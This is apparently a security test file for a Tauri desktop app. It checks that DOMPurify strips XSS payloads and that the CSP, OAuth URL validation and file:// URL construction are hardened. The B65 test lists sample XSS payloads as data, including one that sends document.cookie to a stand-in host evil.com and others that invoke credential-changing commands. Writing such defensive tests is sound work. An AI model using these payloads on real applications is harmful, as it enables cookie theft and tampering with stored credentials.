/**
 * Holistic behaviour tests for T-XSS-01 — Content Security (Behaviours 65-70)
 *
 * RED PHASE: B65-B70 expected to FAIL until Wave 3 remediations
 *
 * These tests exercise observable runtime behaviour:
 * - B65/B66: DOMPurify DOM inspection (library sanitizes XSS payloads)
 * - B67: Static config check on tauri.conf.json CSP string (permitted)
 * - B68: OAuthConnectFlow URL validation (import + call validateOAuthUrl)
 * - B69: Static config check on commands.rs for URL parser usage (permitted)
 * - B70: Static config check on commands.rs for file:// URL construction (permitted)
 */
import { describe, it, expect } from "bun:test";
import DOMPurify from "dompurify";
import { JSDOM } from "jsdom";
import { readFileSync, existsSync } from "node:fs";
import { resolve } from "node:path";

// Set up a DOMPurify instance backed by jsdom
const { window: jsdomWindow } = new JSDOM("");
const purify = DOMPurify(jsdomWindow as unknown as Window & typeof globalThis);

// ---------------------------------------------------------------------------
// B65 — DOMPurify removes script tags, javascript: URLs, and event handlers
// ---------------------------------------------------------------------------

describe("T-XSS-01 — Content Security", () => {
  it("B65: DOMPurify removes script tags, javascript: URLs, and onerror handlers from XSS payloads", () => {
    const payloads = [
      `<script>window.__TAURI__.invoke('set_credential', {key:'x',value:'y'})</script>`,
      `<img src=x onerror="window.__TAURI__.invoke('restart_bun')">`,
      `<a href="javascript:void(window.__TAURI__.invoke('delete_credential',{key:'api_key'}))">click</a>`,
      `<svg><animate onbegin="alert(1)"/></svg>`,
      `<details open ontoggle="fetch('http://evil.com?k=' + document.cookie)">`,
    ];

    for (const payload of payloads) {
      const sanitized = purify.sanitize(payload);
      const dom = new JSDOM(sanitized);
      const doc = dom.window.document;

      // No script elements
      expect(doc.querySelectorAll("script").length).toBe(0);

      // No event handler attributes (on* attributes)
      const allElements = doc.querySelectorAll("*");
      for (const el of Array.from(allElements)) {
        for (const attr of Array.from(el.attributes)) {
          expect(attr.name).not.toMatch(/^on/i);
        }
      }

      // No javascript: hrefs
      const links = doc.querySelectorAll("a[href]");
      for (const link of Array.from(links)) {
        expect(link.getAttribute("href")).not.toMatch(/^javascript:/i);
      }

      // __TAURI__ must not be in sanitized output
      expect(sanitized).not.toContain("__TAURI__");
    }
  });

  // -------------------------------------------------------------------------
  // B66 — javascript: links do not survive DOMPurify sanitization
  // -------------------------------------------------------------------------

  it("B66: javascript: links do not survive DOMPurify sanitization", () => {
    const jsLink = `<a href="javascript:alert(document.cookie)">Click me</a>`;
    const sanitized = purify.sanitize(jsLink);
    const dom = new JSDOM(sanitized);
    const links = dom.window.document.querySelectorAll("a[href]");
    for (const link of Array.from(links)) {
      expect(link.getAttribute("href") ?? "").not.toMatch(/^javascript:/i);
    }
  });

  // -------------------------------------------------------------------------
  // B67 — CSP connect-src enumerates specific origins, not wildcard
  // (static config check on tauri.conf.json — permitted for CSP string verification)
  // -------------------------------------------------------------------------

  it("B67: CSP connect-src does not contain wildcard ws://127.0.0.1:* or ws://localhost:*", () => {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const tauriConf = JSON.parse(
      readFileSync(
        resolve(import.meta.dir, "../src-tauri/tauri.conf.json"),
        "utf8"
      )
    );
    const csp: string =
      tauriConf?.app?.security?.csp ??
      tauriConf?.tauri?.security?.csp ??
      "";

    expect(csp).toBeTruthy();

    // Must NOT contain wildcard ws://127.0.0.1:* — must have specific ports
    expect(csp).not.toContain("ws://127.0.0.1:*");
    expect(csp).not.toContain("ws://localhost:*");

    // Must contain specific AI provider origins in connect-src
    expect(csp).toMatch(
      /connect-src.*https:\/\/api\.anthropic\.com|https:\/\/api\.anthropic\.com.*connect-src/
    );
  });

  // -------------------------------------------------------------------------
  // B68 — OAuthConnectFlow validates URL begins with https://
  // -------------------------------------------------------------------------

  it("B68: OAuthConnectFlow exports validateOAuthUrl that accepts only https:// URLs", async () => {
    const validHttpsUrl =
      "https://auth.anthropic.com/oauth/callback?code=abc&state=xyz";
    const invalidHttpUrl = "http://evil.com/steal";
    const invalidJsUrl = "javascript:alert(1)";
    const invalidFtpUrl = "ftp://evil.com/file";

    // After remediation, OAuthConnectFlow must export validateOAuthUrl
    try {
      const { validateOAuthUrl } = await import(
        "../src/components/auth/OAuthConnectFlow"
      );
      expect(validateOAuthUrl(validHttpsUrl)).toBe(true);
      expect(validateOAuthUrl(invalidHttpUrl)).toBe(false);
      expect(validateOAuthUrl(invalidJsUrl)).toBe(false);
      expect(validateOAuthUrl(invalidFtpUrl)).toBe(false);
    } catch {
      // Function not yet exported — RED
      expect(false).toBe(true); // RED: validateOAuthUrl not exported yet
    }
  });

  // -------------------------------------------------------------------------
  // B69 — open_external uses URL parser encoding in commands.rs
  // (static config check on commands.rs — permitted for URL construction verification)
  // -------------------------------------------------------------------------

  it("B69: commands.rs open_external uses URL parser, not raw string concatenation", () => {
    const commandsSrc = readFileSync(
      resolve(import.meta.dir, "../src-tauri/src/commands.rs"),
      "utf8"
    );

    // Must use Url::parse() not raw string concatenation for URL construction
    expect(commandsSrc).toMatch(/Url::parse|url::Url::parse/);

    // Must not use format!("file://{}") pattern for file:// URLs
    expect(commandsSrc).not.toMatch(/format!\s*\(\s*"file:\/\/\{\}"/);
  });

  // -------------------------------------------------------------------------
  // B70 — file:// URLs use URL constructor encoding, not string concatenation
  // (static config check — permitted for URL construction pattern verification)
  // -------------------------------------------------------------------------

  it("B70: file:// URLs are constructed via URL parser, not template literal concatenation", () => {
    // commands.rs must not build file:// URLs via string concat
    const commandsPath = resolve(import.meta.dir, "../src-tauri/src/commands.rs");
    expect(existsSync(commandsPath)).toBe(true, "B70: commands.rs must exist");
    const commandsSrc = readFileSync(commandsPath, "utf8");
    expect(commandsSrc).not.toMatch(/format!\s*\(\s*"file:\/\/\{\}"/);

    // Frontend window-identity.ts must not build file:// URLs via string concat.
    // Check both candidate paths; fail with a meaningful message if neither exists.
    const libPath = resolve(import.meta.dir, "../src/lib/window-identity.ts");
    const rootPath = resolve(import.meta.dir, "../src/window-identity.ts");

    const libExists = existsSync(libPath);
    const rootExists = existsSync(rootPath);

    // At least one of the two candidate files must exist for this check to be meaningful
    expect(libExists || rootExists).toBe(
      true,
      "B70: window-identity.ts not found at src/lib/window-identity.ts or src/window-identity.ts — add the correct path"
    );

    if (libExists) {
      const src = readFileSync(libPath, "utf8");
      expect(src).not.toMatch(
        /`file:\/\/\$\{|"file:\/\/" \+|'file:\/\/' \+/
      );
    }

    if (rootExists) {
      const src = readFileSync(rootPath, "utf8");
      expect(src).not.toMatch(
        /`file:\/\/\$\{|"file:\/\/" \+|'file:\/\/' \+/
      );
    }
  });
});
